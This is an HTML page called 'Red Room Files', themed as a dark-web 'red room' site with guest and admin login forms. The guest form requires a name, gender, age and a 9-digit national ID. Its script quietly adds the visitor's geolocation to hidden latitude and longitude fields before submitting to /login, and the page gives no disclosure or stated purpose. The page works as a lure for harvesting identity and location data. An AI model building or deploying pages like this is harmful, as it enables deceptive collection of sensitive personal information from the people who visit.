<!DOCTYPE html>
<html lang="en">

<head>
<meta charset="UTF-8">
<title>Red Room Files</title>

<style>

/* ================= BACKGROUND ================= */
body{
    margin:0;
    padding:0;
    background: radial-gradient(circle at top, #111, #050505);
    color:white;
    font-family: "Segoe UI", sans-serif;

    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
    overflow:hidden;
    position:relative;
}

/* glowing background blob */
body::before{
    content:"";
    position:absolute;
    width:300px;
    height:300px;
    background:red;
    filter:blur(150px);
    top:10%;
    left:20%;
    opacity:0.2;
    animation:move 6s infinite alternate;
}

@keyframes move{
    0%{transform:translate(0,0);}
    100%{transform:translate(200px,100px);}
}

/* ================= BOX ================= */
.login-box{
    background: rgba(10,10,10,0.85);
    backdrop-filter: blur(10px);
    border:1px solid rgba(255,0,0,0.4);
    padding:40px;
    width:350px;
    text-align:center;
    border-radius:16px;
    box-shadow:0 10px 40px rgba(0,0,0,0.7);

    animation:fadeIn 1s ease-in-out;
    position:relative;
}

@keyframes fadeIn{
    from{opacity:0; transform:translateY(30px);}
    to{opacity:1; transform:translateY(0);}
}

/* ================= TITLE ================= */
h1{
    color:#ff2b2b;
    letter-spacing:2px;
    text-shadow:0 0 10px red;
    animation:glow 2s infinite alternate;
}

@keyframes glow{
    from{text-shadow:0 0 5px red;}
    to{text-shadow:0 0 20px red, 0 0 40px darkred;}
}

/* ================= BUTTONS ================= */
button{
    margin:10px 0;
    padding:12px;
    background:linear-gradient(90deg,#000,#111);
    border:1px solid red;
    color:white;
    cursor:pointer;
    width:100%;
    border-radius:10px;
    transition:0.3s;
}

button:hover{
    background:red;
    transform:scale(1.05);
    box-shadow:0 0 20px red;
}

/* ================= INPUTS ================= */
input,select{
    width:100%;
    padding:12px;
    margin:8px 0;
    background:rgba(0,0,0,0.6);
    border:1px solid #222;
    color:white;
    border-radius:8px;
    outline:none;
}

input:focus,select:focus{
    border:1px solid red;
}

/* ================= LOADING ================= */
.loading{
    color:lime;
    display:none;
    margin-top:10px;
}

</style>

</head>

<body>

<div class="login-box">

<h1>👁 Red Room Files</h1>

<button onclick="showGuest()">Enter as Guest</button>
<button onclick="showAdmin()">Admin Login</button>

<!-- ================= GUEST ================= -->
<form action="/login"
method="POST"
id="guestForm"
style="display:none;"
onsubmit="return loadingGuest()">

<input type="hidden" name="latitude" id="latitude">
<input type="hidden" name="longitude" id="longitude">

<input name="name" placeholder="Name" required>

<select name="gender" required>
<option value="">Gender</option>
<option>Male</option>
<option>Female</option>
<option>Other</option>
</select>

<input name="age"
type="number"
placeholder="Age"
min="10"
max="120"
required>

<input name="national_id"
placeholder="9 Digit ID"
maxlength="9"
pattern="[0-9]{9}"
required>

<button id="guestBtn">Enter</button>

<div class="loading" id="guestLoading">
Connecting...
</div>

</form>

<!-- ================= ADMIN ================= -->
<form action="/admin"
method="POST"
id="adminForm"
style="display:none;"
onsubmit="return loadingAdmin()">

<input name="email" placeholder="Admin Email" required>

<input name="password"
type="password"
placeholder="Password"
required>

<button id="adminBtn">Login</button>

<div class="loading" id="adminLoading">
Opening...
</div>

</form>

</div>

<script>

function showGuest(){
document.getElementById("guestForm").style.display="block";
document.getElementById("adminForm").style.display="none";
}

function showAdmin(){
document.getElementById("adminForm").style.display="block";
document.getElementById("guestForm").style.display="none";
}

function loadingGuest(){

let id=document.querySelector('input[name="national_id"]').value;

if(!/^[0-9]{9}$/.test(id)){
alert("ID must be exactly 9 digits");
return false;
}

document.getElementById("guestBtn").disabled=true;
document.getElementById("guestLoading").style.display="block";

if(navigator.geolocation){

    navigator.geolocation.getCurrentPosition(
        function(position){
            document.getElementById("latitude").value =
            position.coords.latitude;

            document.getElementById("longitude").value =
            position.coords.longitude;

            document.getElementById("guestForm").submit();
        },
        function(){
            document.getElementById("guestForm").submit();
        }
    );

    return false;
}

return true;
}

function loadingAdmin(){
document.getElementById("adminBtn").disabled=true;
document.getElementById("adminLoading").style.display="block";
return true;
}

</script>

</body>
</html>
